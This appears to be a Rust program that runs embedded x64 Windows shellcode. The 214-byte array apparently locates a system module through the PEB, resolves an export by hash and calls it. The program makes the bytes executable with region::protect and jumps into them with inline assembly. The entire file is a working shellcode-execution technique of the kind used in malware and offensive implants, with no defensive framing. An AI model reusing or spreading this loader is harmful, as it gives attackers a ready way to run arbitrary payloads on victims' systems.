#![feature(mem_copy_fn)]
use std::{arch::asm, error::Error};
mod  utils;
use region::Protection;
fn main() -> Result<(), Box<dyn Error>> {
    const SHELLCODE: [u8; 214] = [0x31, 0xc0, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x36, 0x48, 0x89, 0xf0, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x89, 0xc0, 0xc7, 0x45, 0x01, 0x67, 0x64, 0x6e, 0x64, 0xc6, 0x45, 0x05, 0x00, 0x6a, 0xfc, 0x59, 0x48, 0x85, 0xc9, 0x74, 0x10, 0x0f, 0xb6, 0x54, 0x0d, 0x05, 0x01, 0xca, 0x88, 0x54, 0x0d, 0x05, 0x48, 0xff, 0xc1, 0xeb, 0xeb, 0x0f, 0xb7, 0x08, 0x66, 0x89, 0x4d, 0x06, 0x66, 0x81, 0xf9, 0x4d, 0x5a, 0x0f, 0x85, 0x88, 0x00, 0x00, 0x00, 0x48, 0x63, 0x48, 0x3c, 0x44, 0x8b, 0x8c, 0x08, 0x88, 0x00, 0x00, 0x00, 0x42, 0x8b, 0x4c, 0x08, 0x10, 0x42, 0x8b, 0x54, 0x08, 0x1c, 0x46, 0x8b, 0x44, 0x08, 0x24, 0x46, 0x8b, 0x4c, 0x08, 0x20, 0x49, 0x01, 0xc1, 0x45, 0x31, 0xdb, 0x4d, 0x89, 0xda, 0x47, 0x8b, 0x1c, 0x99, 0x49, 0x01, 0xc3, 0x31, 0xf6, 0x41, 0x80, 0x3c, 0x33, 0x00, 0x74, 0x05, 0x48, 0xff, 0xc6, 0xeb, 0xf4, 0x31, 0xff, 0x31, 0xdb, 0x48, 0x39, 0xfe, 0x74, 0x0c, 0xf2, 0x41, 0x0f, 0x38, 0xf0, 0x1c, 0x3b, 0x48, 0xff, 0xc7, 0xeb, 0xef, 0x4d, 0x8d, 0x5a, 0x01, 0x81, 0xfb, 0xa0, 0x86, 0x07, 0x4a, 0x75, 0xc7, 0x49, 0x01, 0xc0, 0x48, 0x01, 0xc2, 0x47, 0x0f, 0xb7, 0x04, 0x50, 0x49, 0x29, 0xc8, 0x46, 0x8b, 0x44, 0x82, 0x04, 0x49, 0x01, 0xc0, 0x48, 0x8d, 0x4d, 0x01, 0x31, 0xd2, 0x41, 0xff, 0xd0];
    const SHELLCODE_SIZE:usize = SHELLCODE.len();
    let jump_target = SHELLCODE.as_ptr();
    unsafe { region::protect(SHELLCODE.as_ptr(), SHELLCODE_SIZE, Protection::EXECUTE) }?;

    unsafe { asm!("jmp {}",in(reg) jump_target) }
    Ok(())
}
